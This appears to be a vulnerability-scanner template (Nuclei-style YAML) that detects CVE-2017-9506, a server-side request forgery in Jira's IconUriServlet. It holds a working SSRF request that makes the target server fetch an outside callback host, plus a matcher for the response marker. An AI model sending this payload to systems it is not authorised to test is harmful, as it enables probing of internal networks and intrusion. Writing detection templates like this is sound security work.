id: CVE-2017-9506

info:
  name: Jira IconURIServlet SSRF
  author: pdteam
  severity: high
  description: The IconUriServlet of the Atlassian OAuth Plugin from version 1.3.0 before version 1.9.12 and from version 2.0.0 before version 2.0.4 allows remote attackers to access the content of internal network resources and/or perform an XSS attack via Server Side Request Forgery (SSRF).
  reference: |
    - http://dontpanic.42.nl/2017/12/there-is-proxy-in-your-atlassian.html
    - https://ecosystem.atlassian.net/browse/OAUTH-344
    - https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-171018bca2c3
  tags: cve,cve2017,atlassian,jira,ssrf

requests:
  - method: GET
    path:
      - "{{BaseURL}}/plugins/servlet/oauth/users/icon-uri?consumerUri=https://h5n1tbn8qh6qe06dpnfx2xng47axym.c.act1on3.site"
    matchers:
      - type: word
        words:
          - "<html><body>ixq105k6wse36l44e350exzjjgz</body></html>"
        part: body
